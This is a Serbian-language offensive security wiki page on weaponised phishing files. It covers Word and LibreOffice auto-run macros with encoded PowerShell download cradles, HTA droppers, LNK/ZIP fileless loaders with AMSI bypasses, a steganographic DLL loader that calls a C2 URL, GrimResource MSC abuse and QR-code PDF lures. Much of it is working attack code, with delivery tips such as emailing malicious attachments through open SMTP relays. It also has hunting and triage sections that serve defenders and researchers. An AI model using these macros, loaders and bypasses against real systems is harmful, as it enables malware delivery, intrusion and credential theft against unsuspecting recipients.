# Phishing datoteke i dokumenti

{{#include ../../banners/hacktricks-training.md}}

## Office dokumenti

Microsoft Word obavlja validaciju podataka datoteke pre nego što je otvori. Validacija podataka se vrši u obliku identifikacije strukture podataka, u odnosu na standard OfficeOpenXML. Ako dođe do greške tokom identifikacije strukture podataka, analizirana datoteka neće biti otvorena.

Obično Word datoteke koje sadrže makroe koriste ekstenziju `.docm`. Međutim, moguće je preimenovati datoteku promenom ekstenzije datoteke i zadržati mogućnost izvršavanja makroa.\
Na primer, RTF datoteke po dizajnu ne podržavaju makroe, ali DOCM datoteka preimenovana u RTF biće obrađena u programu Microsoft Word i moći će da izvršava makroe.\
Isti interni elementi i mehanizmi primenjuju se na sav softver iz Microsoft Office Suite (Excel, PowerPoint itd.).

Možete koristiti sledeću komandu da proverite koje ekstenzije će izvršavati neki Office programi:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX datoteke koje upućuju na remote template (File –Options –Add-ins –Manage: Templates –Go), a koji uključuje macros, takođe mogu da „izvrše“ macros.

### Učitavanje spoljne slike

Idite na: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, i **Filename or URL**:_ http://<ip>/whatever

![Office Documents - Učitavanje spoljne slike: Idite na: Insert -- Quick Parts -- Field](<../../images/image (155).png>)

### Backdoor pomoću macros

Moguće je koristiti macros za pokretanje proizvoljnog koda iz dokumenta.

#### Autoload funkcije

Što su one uobičajenije, veća je verovatnoća da će ih AV detektovati.

- AutoOpen()
- Document_Open()

#### Primeri koda za macros
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Ručno uklanjanje metapodataka

Idite na **File > Info > Inspect Document > Inspect Document**, čime će se otvoriti Document Inspector. Kliknite na **Inspect**, a zatim na **Remove All** pored opcije **Document Properties and Personal Information**.

#### Doc ekstenzija

Kada završite, izaberite padajući meni **Save as type** i promenite format iz **`.docx`** u Word 97-2003 **`.doc`**.\
Ovo uradite zato što **ne možete sačuvati makroe unutar `.docx`** i zato što postoji **stigmatizacija** oko ekstenzije koja podržava makroe, **`.docm`** (npr. ikona sličice ima veliko `!`, a neki web/email gateway-i ih u potpunosti blokiraju). Zbog toga je ova **nasleđena `.doc` ekstenzija najbolji kompromis**.

#### Generatori zlonamernih makroa

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## LibreOffice ODT makroi koji se automatski pokreću (Basic)

LibreOffice Writer dokumenti mogu sadržati Basic makroe i automatski ih izvršiti kada se datoteka otvori, povezivanjem makroa sa događajem **Open Document** (Tools → Customize → Events → Open Document → Macro…).<sup>[[1]](#references)</sup> Jednostavan makro za reverse shell izgleda ovako:
```vb
Sub Shell
Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```
Imajte na umu dvostruke navodnike (`""`) unutar stringa – LibreOffice Basic ih koristi za escape literalnih navodnika, tako da payload-ovi koji se završavaju sa `...==""")` zadržavaju i unutrašnju komandu i Shell argument pravilno uparene.

Saveti za isporuku:

- Sačuvajte kao `.odt` i povežite macro sa događajem dokumenta kako bi se odmah pokrenuo prilikom otvaranja.
- Prilikom slanja email-a pomoću `swaks`, koristite `--attach @resume.odt` (`@` je obavezan kako bi se bajtovi fajla, a ne string sa nazivom fajla, poslali kao attachment). Ovo je ključno prilikom zloupotrebe SMTP servera koji prihvataju proizvoljne `RCPT TO` primaoce bez validacije.

## HTA Files

HTA je Windows program koji **kombinuje HTML i scripting jezike (kao što su VBScript i JScript)**. Generiše korisnički interfejs i izvršava se kao aplikacija sa „potpunim poverenjem“, bez ograničenja bezbednosnog modela browser-a.

HTA se izvršava pomoću **`mshta.exe`**, koji se obično **instalira** zajedno sa **Internet Explorer-om**, zbog čega **`mshta` zavisi od IE-a**. Ako je deinstaliran, HTA datoteke neće moći da se izvršavaju.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Prisiljavanje NTLM autentikacije

Postoji nekoliko načina da se **"na daljinu" prisili NTLM autentikacija**, na primer, možete dodati **nevidljive slike** u emailove ili HTML kojem će korisnik pristupiti (čak i HTTP MitM?). Ili žrtvi poslati **adresu datoteka** koje će **pokrenuti** **autentikaciju** samo **otvaranjem foldera.**

**Pogledajte ove i druge ideje na sledećim stranicama:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Ne zaboravite da ne možete samo ukrasti hash ili autentikaciju, već možete i **izvršavati NTLM relay napade**:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Veoma efikasne kampanje isporučuju ZIP koji sadrži dva legitimna decoy dokumenta (PDF/DOCX) i zlonamerni .lnk. Trik je u tome što se stvarni PowerShell loader čuva unutar sirovih bajtova ZIP-a, nakon jedinstvenog markera, a .lnk ga izdvaja i izvršava u potpunosti u memoriji.<sup>[[2]](#references)</sup>

Tipičan tok koji implementira PowerShell one-liner unutar .lnk datoteke:

1) Pronaći originalni ZIP u uobičajenim putanjama: Desktop, Downloads, Documents, %TEMP%, %ProgramData% i nadređenom direktorijumu trenutnog working directory-ja.
2) Pročitati bajtove ZIP-a i pronaći hardkodovani marker (npr. xFIQCV). Sve nakon markera predstavlja ugrađeni PowerShell payload.
3) Kopirati ZIP u %ProgramData%, tamo ga raspakovati i otvoriti decoy .docx kako bi sve izgledalo legitimno.
4) Zaobići AMSI za trenutni proces: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Deobfuskirati sledeću fazu (npr. ukloniti sve znakove #) i izvršiti je u memoriji.

Primer PowerShell skeleton-a za izdvajanje i pokretanje ugrađene faze:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Napomene
- Delivery često zloupotrebljava poddomene renomiranih PaaS platformi (npr. *.herokuapp.com) i može ograničiti payload-e (poslužiti bezopasne ZIP datoteke na osnovu IP/UA podataka).
- Sledeća faza često dešifruje base64/XOR shellcode i izvršava ga pomoću Reflection.Emit + VirtualAlloc kako bi se smanjili artefakti na disku.

Persistence korišćen u istom lancu
- COM TypeLib hijacking Microsoft Web Browser kontrole, tako da IE/Explorer ili bilo koja aplikacija koja je ugrađuje automatski ponovo pokrene payload.<sup>[[2]](#references)[[4]](#references)</sup> Detalje i komande spremne za upotrebu pogledajte ovde:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- ZIP datoteke koje sadrže ASCII marker string (npr. xFIQCV) dodat na kraj podataka arhive.
- .lnk koji pretražuje nadređene/korisničke fascikle kako bi pronašao ZIP i otvorio dokument za odvraćanje pažnje.
- AMSI tampering pomoću [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Dugotrajne poslovne niti koje se završavaju linkovima hostovanim na pouzdanim PaaS domenima.

## LNK decoy-first staging → scheduled-task persistence → trusted CPL side-loading

Još jedan obrazac koji se ponavlja jeste **`.lnk` koji oponaša dokument** i odmah otvara bezopasan mamac, dok u pozadini priprema stvarni lanac.<sup>[[3]](#references)</sup>

Uočeni tok:
1. Prečica **se predstavlja kao PDF** i koristi `conhost.exe` ili sličan proxy za pokretanje obfuskovanog PowerShell downloader-a.
2. PowerShell fragmentiše očigledne tokene (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`), tako da naivne detekcije koje traže `iwr`, `gci`, `ren`, `cpi` ili `schtasks` ne prepoznaju komandu.
3. Stager prvo preuzima **dokument za odvraćanje pažnje**, otvara ga žrtvi, a zatim u pozadini rekonstruiše zlonamerne datoteke.
4. Payload-i mogu biti upisani sa **lažnim ekstenzijama**, a zatim preimenovani uklanjanjem dodatnih znakova, čime se odlaže pojavljivanje očiglednih `.exe` / `.cpl` artefakata.
5. Persistence se uspostavlja pomoću **scheduled task-a zasnovanog na minutima**, koji pokreće pouzdani host binary iz putanje u koju korisnik može da upisuje.

Minimalni hunting tragovi iz ovog obrasca:
```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```
Korisna staging postavka koju treba prepoznati je:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` ili `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### Zašto je druga faza prikrivena

U Rapid7 studiji slučaja, scheduled task je iznova pokretao **`Fondue.exe`** iz direktorijuma `C:\Users\Public\`. Pošto je **`APPWIZ.cpl`** bio postavljen pored njega i izvozio **`RunFODW`**, trusted Microsoft binary je učitao attacker CPL umesto legitimne sistemske kopije.

CPL zatim:
- Čita **AES-256-CBC** blob iz `C:\Windows\Tasks\editor.dat`
- Dešifruje ga kroz **Windows CNG / `bcrypt.dll`**
- Alocira izvršnu memoriju i kopira dešifrovani shellcode
- Indirektno ga izvršava prosleđivanjem pokazivača na shellcode kao callback-a za **`EnumUILanguagesW`**

Ovaj poslednji korak vredi posebno tražiti: malware često izbegava direktan skok `((void(*)())buf)()` i umesto toga zloupotrebljava **legitimate callback-taking WinAPI** za prenos izvršavanja.

Dešifrovani payload u ovoj kampanji bio je **Donut** shellcode, koji je zatim u potpunosti mapirao završni PE u memoriju i zakrpio **AMSI/WLDP/ETW** u trenutnom procesu pre prosleđivanja izvršavanja. Za detaljnije beleške o side-loading-u i memory-resident post-processing-u pogledajte:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Praktični hunting pivoti:
- `.lnk` koji pokreće `powershell.exe` ili `conhost.exe`, nakon čega sledi vidljiv decoy dokument.
- Kratkotrajna preuzimanja u **`C:\Users\Public\`**, nakon kojih odmah slede preimenovanja iz nonsense ekstenzija.
- Scheduled tasks sa bezazlenim imenima, kao što je `GoogleErrorReport`, koji se izvršavaju iz **user-writable directories**.
- Trusted binaries koji učitavaju **`.cpl` / `.dll`** fajlove iz istog non-system direktorijuma.
- Base64 tekstualni blobovi upisani u **`C:\Windows\Tasks\`**, koje zatim čita side-loaded modul.

## Payload-i razgraničeni steganografijom u slikama (PowerShell stager)

Noviji loader lanci isporučuju obfuskovani JavaScript/VBS koji dekodira i pokreće Base64 PowerShell stager. Taj stager preuzima sliku (često GIF) koja sadrži Base64-enkodovani .NET DLL sakriven kao običan tekst između jedinstvenih početnih/završnih markera. Skripta pretražuje ove delimitere (primeri uočeni u praksi: «<<sudo_png>> … <<sudo_odt>>>»), izdvaja tekst između njih, Base64-dekodira ga u bajtove, učitava assembly u memoriju i poziva poznati entry method sa C2 URL-om.<sup>[[5]](#references)</sup>

Tok rada
- Faza 1: Arhivirani JS/VBS dropper → dekodira ugrađeni Base64 → pokreće PowerShell stager sa -nop -w hidden -ep bypass.
- Faza 2: PowerShell stager → preuzima sliku, izdvaja Base64 ograničen markerima, učitava .NET DLL u memoriju i poziva njegov metod (npr. VAI), prosleđujući C2 URL i opcije.
- Faza 3: Loader preuzima završni payload i obično ga injektuje putem process hollowing-a u trusted binary (najčešće MSBuild.exe).<sup>[[7]](#references)[[8]](#references)</sup> Više o process hollowing-u i trusted utility proxy execution-u pogledajte ovde:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

PowerShell primer za izdvajanje DLL-a iz slike i pozivanje .NET metoda u memoriji:

<details>
<summary>PowerShell stego payload extractor i loader</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

Napomene
- Ovo je ATT&CK T1027.003 (steganography/marker-hiding).<sup>[[6]](#references)</sup> Markers se razlikuju između kampanja.
- AMSI/ETW bypass i deobfuscation stringova se obično primenjuju pre učitavanja assembly-ja.
- Hunting: skenirajte preuzete slike u potrazi za poznatim delimiterima; identifikujte PowerShell koji pristupa slikama i odmah dekodira Base64 blobove.

Pogledajte i stego alate i carving tehnike:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

Česta početna faza je mali, snažno obfusciran `.js` ili `.vbs` fajl isporučen unutar arhive. Njegova jedina svrha je da dekodira ugrađeni Base64 string i pokrene PowerShell sa `-nop -w hidden -ep bypass`, kako bi se sledeća faza pokrenula preko HTTPS-a.<sup>[[5]](#references)</sup>

Skeleton logic (abstract):
- Pročitati sadržaj sopstvenog fajla
- Locirati Base64 blob između junk stringova
- Dekodirati u ASCII PowerShell
- Izvršiti pomoću `wscript.exe`/`cscript.exe`, uz pozivanje `powershell.exe`

Hunting cues
- Arhivirani JS/VBS attachmenti koji pokreću `powershell.exe` sa `-enc`/`FromBase64String` u command line-u.
- `wscript.exe` koji pokreće `powershell.exe -nop -w hidden` iz user temp putanja.

## MSC dokumenti kao execution containers (GrimResource)

Microsoft Management Console fajlovi (`.msc`) su XML definicije konzole koje se obično otvaraju pomoću `mmc.exe`. **GrimResource** weaponizes `StringTable` referencu na `apds.dll` resource koji sadrži stari XSS primitive, tako da otvaranje crafted konzole od strane korisnika izaziva izvršavanje JavaScript-a unutar `mmc.exe`. U posmatranim uzorcima kombinovani su `transformNode`-based obfuscation i **DotNetToJScript** za instanciranje .NET payload-a bez uobičajenog Office-macro puta.<sup>[[9]](#references)</sup>

Za static triage, tretirajte nepouzdani MSC kao tekst i **nemojte ga otvarati dvostrukim klikom**:<sup>[[9]](#references)</sup>
```bash
file lure.msc
xmllint --format lure.msc > lure.formatted.xml
grep -Eina 'apds\.dll|res://|StringTable|transformNode|ActiveXObject|FromBase64String' lure.formatted.xml
strings -el lure.msc | grep -Ei 'powershell|cmd\.exe|http|base64'
```
Runtime indikatori visoke vrednosti su kada `mmc.exe` učitava CLR ili script komponente, uspostavlja network connections ili pokreće `powershell.exe`, `cmd.exe`, `wscript.exe`, `cscript.exe`, `mshta.exe`, `rundll32.exe` ili neočekivani executable. Format je legitiman, pa detekcije treba da korelišu **poreklo + sumnjiv XML/script sadržaj + ponašanje `mmc.exe`**, umesto da blokiraju svaki MSC.<sup>[[9]](#references)</sup>

## PDF/QR redirectori i payload gating

PDF-u nije potreban exploit da bi bio koristan. Nedavne kampanje postavljaju **QR code ili običan link** u dokument koji izgleda bezazleno, preusmeravaju browser sesiju izvan mail kontrola i personalizuju destinaciju adresom primaoca. Microsoft je dokumentovao PDF-ove iz 2025. čiji su QR URL-ovi bili jedinstveni za svakog primaoca i vodili do RaccoonO365 infrastrukture za krađu credentials; paralelni lanac koristio je IP/environment gating da odabranim posetiocima vrati JavaScript/MSI putanju, a skenerima ili nedozvoljenim klijentima bezazleni PDF.<sup>[[10]](#references)</sup>

Analizirajte i PDF actions i renderovane QR kodove. QR može biti nacrtan kao vektor umesto da bude sačuvan kao image koji se može izdvojiti, zato rasterizujte svaku stranicu i izdvojite ugrađene image fajlove:
```bash
pdfid.py lure.pdf
pdfdetach -list lure.pdf
qpdf --qdf --object-streams=disable lure.pdf expanded.pdf
grep -aE '/(URI|OpenAction|AA|Launch|EmbeddedFile)|https?://' expanded.pdf
pdfimages -png lure.pdf image
pdftoppm -png -r 300 lure.pdf page
zbarimg --quiet image-*.png page-*.png
```
Pregledajte dekodirana odredišta i redirects sa izolovanog sistema za analizu, bez autentifikacije. Korisne hunting karakteristike uključuju PDF-ove koji sadrže samo QR kod i gotovo prazna tela mejlova, email primaoca ugrađen u query parametar, nekoliko redirects-a kroz reputabilan hosting i različit sadržaj koji se vraća u zavisnosti od IP adrese, geolokacije, cookies-a, referrer-a ili user agent-a. Uporedite zahteve sa kontrolisanim profilima jer jedan sandbox fetch može da primi samo decoy sadržaj.<sup>[[10]](#references)</sup>

## Windows fajlovi za krađu NTLM hash-eva

Pogledajte stranicu o **mestima za krađu NTLM creds-a**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}




## References

- [1] [HTB Job – LibreOffice macro → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – ZipLine Campaign: Sofisticirani phishing napad usmeren na kompanije u SAD](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode: Praćenje tradecraft-a grupe Dropping Elephant kroz China-themed loader chain](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Hijack the TypeLib – Nova COM persistence tehnika (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – PhantomVAI Loader isporučuje niz infostealer-a](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – Steganografija (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
- [9] [Elastic Security Labs – GrimResource: Microsoft Management Console za initial access i evasion](https://www.elastic.co/security-labs/threat-command/grimresource)
- [10] [Microsoft Security Blog – Threat actors koriste poresku sezonu za deploy tax-themed phishing campaigns](https://www.microsoft.com/en-us/security/blog/2025/04/03/threat-actors-leverage-tax-season-to-deploy-tax-themed-phishing-campaigns/)
{{#include ../../banners/hacktricks-training.md}}
